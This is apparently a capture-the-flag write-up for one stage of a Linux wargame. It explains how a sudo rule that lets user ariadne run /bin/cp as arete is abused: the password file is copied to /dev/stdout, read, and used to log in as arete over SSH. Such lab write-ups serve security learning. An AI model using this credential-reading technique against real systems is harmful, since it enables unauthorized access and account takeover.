# 0x08

moving from `ariadne` to `arete`

---

The mission clue for this stage focused on the `cp` (copy) utility:

```bash
ariadne@hades:~$ cat mission.txt 
################
# MISSION 0x08 #
################

## EN ##
The user arete lets us use cp on her behalf. 
```

Checking the available privileges with `sudo -l`, I discovered that user `ariadne` was permitted to run `/bin/cp` as the user `arete` without a password.

```bash
ariadne@hades:~$ sudo -l
...
User ariadne may run the following commands on hades:
    (arete) NOPASSWD: /bin/cp
```

### The Solution: Exploiting Sudo Privileges on `cp`

Since I had the power to copy files as `arete`, I could read her private password file by copying it to a location I controlled or by outputting it directly to the terminal.

#### Step 1: Locating the Password

A search for files containing "arete" revealed the location of the password file in a non-standard directory.

```bash
ariadne@hades:~$ find / -name "*arete_pass*" 2>/dev/null
/run/lock/arete_pass.txt
```

#### Step 2: Reading the File

While I initially tried copying the file to `/tmp`, a much simpler method with `cp` is to copy the target file to `/dev/stdout`. This prints the file contents directly to the screen.

```bash
ariadne@hades:~$ sudo -u arete /bin/cp /run/lock/arete_pass.txt /dev/stdout
[REDACTED]
```

### Explanation

* **Sudo with `-u**`: The `sudo` command allows a user to execute a command as another user. By specifying `-u arete`, I invoked the `cp` command with Arete's identity.
* **Privileged File Access**: The file `/run/lock/arete_pass.txt` was only readable by `root` or `arete`. Using `sudo` allowed me to bypass the restriction.
* **`/dev/stdout`**: In Linux, everything is a file. Copying a file to `/dev/stdout` is a clever way to "read" it using a program that is usually meant for writing, as the output is redirected to the terminal window.

### Execution

Using the identified password, I successfully logged in via SSH to establish a clean session as `arete`.

```bash
ariadne@hades:~$ ssh arete@localhost
arete@hades:~$ id
uid=2050(arete) gid=2050(arete) groups=2050(arete)
```
